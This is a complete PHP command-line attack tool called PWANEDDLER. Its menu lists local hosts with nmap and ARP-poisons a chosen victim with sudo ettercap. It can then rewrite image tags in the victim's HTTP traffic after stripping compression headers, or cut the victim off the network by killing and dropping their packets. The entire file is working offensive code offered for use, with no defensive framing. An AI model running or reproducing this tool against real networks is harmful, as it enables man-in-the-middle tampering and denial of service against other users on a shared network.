#!/usr/bin/php
<?php
$interface = "en1";
define("BANNER","
 ____                               _     _ _           
|  _ \__      ____ _ _ __   ___  __| | __| | | ___ _ __ 
| |_) \ \ /\ / / _` | '_ \ / _ \/ _` |/ _` | |/ _ \ '__|
|  __/ \ V  V / (_| | | | |  __/ (_| | (_| | |  __/ |   
|_|     \_/\_/ \__,_|_| |_|\___|\__,_|\__,_|_|\___|_|   by 0R10n

");
function backMenu()
{
   echo "\n0) Back to menu\n1) Exit\n> ";
   if (cin() == '0') menu();
   else die("Grazie per aver utilizzato PWANEDDLER\n");
}

function colorize($text, $status)
{
   $out = "";
   switch ($status)
   {
   case "SUCCESS":
      $out = "[42m";
      break;

   case "FAILURE":
      $out = "[41m";
      break;

   case "WARNING":
      $out = "[43m";
      break;

   case "NOTE":
      $out = "[44m";
      break;

   default:
      throw new Exception("Invalid status: " . $status);
   }

   return chr(27) . "$out" . "$text" . chr(27) . "[0m";
}

function performReplace($ip, $image)
{
   global $interface;
   $script = '
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Rubbish!"); 
      msg("zapped Accept-Encoding!\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   replace("img src=", "img src=\"' . $image . '\" ");
   replace("IMG SRC=", "img src=\"' . $image . '\" ");
   msg("Filtro lanciato.\n");
}
';
   file_put_contents('.pwaneddler.eft', $script);
   $result = exec('etterfilter .pwaneddler.eft -o .pwaneddler.ef | grep "Script encoded into 16 instructions."');
   if (trim($result) != '-> Script encoded into 16 instructions.') error("Etterfilter not working");
   system('sudo ettercap -T -q -i ' . $interface . ' -F .pwaneddler.ef -M ARP /' . $ip . '/// ');
}

function listHost()
{
   cls();
   echo BANNER . "\n";
   system("nmap -sP 192.168.1.1/24  | grep 'Nmap scan report for ' | awk -F 'for ' '{print $2}'");
   backMenu();
}

function performOffline($ip)
{
   global $interface;
   $script = "
if (ip.src == '$ip' || ip.dst == '$ip') {
   kill();
   drop();
   " . 'msg("Filtro lanciato.");' . "
}
";
   file_put_contents('.pwaneddler.eft', $script);
   $result = exec('etterfilter .pwaneddler.eft -o .pwaneddler.ef | grep "Script encoded"');
   if (trim($result) != '-> Script encoded into 8 instructions.') error("Etterfilter not working");
   system('sudo ettercap -T -q -i ' . $interface . ' -F .pwaneddler.ef -M ARP /' . $ip . '/// ');
}

function error($str)
{
   cls();
   echo BANNER . "\n" . colorize('[ERROR]' . $str . "\n", "FAILURE");
   die();
}

function imageReplacer()
{
   cls();
   echo BANNER . "
Insert IP: ";
   $ip = cin();
   $valid = filter_var($ip, FILTER_VALIDATE_IP);
   if ($valid)
   {
      cls();
      echo BANNER . "
Insert IP: $ip
Insert Image Link: ";
      $image = cin();
      if (!empty(trim(file_get_contents($image)))) performReplace($ip, $image);
      else error('No valid Image URL!');
   }
   else error('No valid IP address!');
}

function turnOffline()
{
   cls();
   echo BANNER . "
Insert IP: ";
   $ip = cin();
   $valid = filter_var($ip, FILTER_VALIDATE_IP);
   if ($valid) performOffline($ip);
   else error('No valid IP address!');
}

function cin()
{
   return trim(fgets(fopen("php://stdin", "r")));
}

function cls()
{
   system('clear');
}

function menu()
{
   cls();
   echo BANNER . "
1) Image Replacer
2) Turn Offline
3) Host list

0) Exit
";
   $cmd = cin();
   switch ($cmd)
   {
   case '1':
      imageReplacer();
      break;

   case '2':
      turnOffline();
      break;

   case '3':
      listHost();
      break;

   default:
      die("\n");
      break;
   }
}

menu();


?>
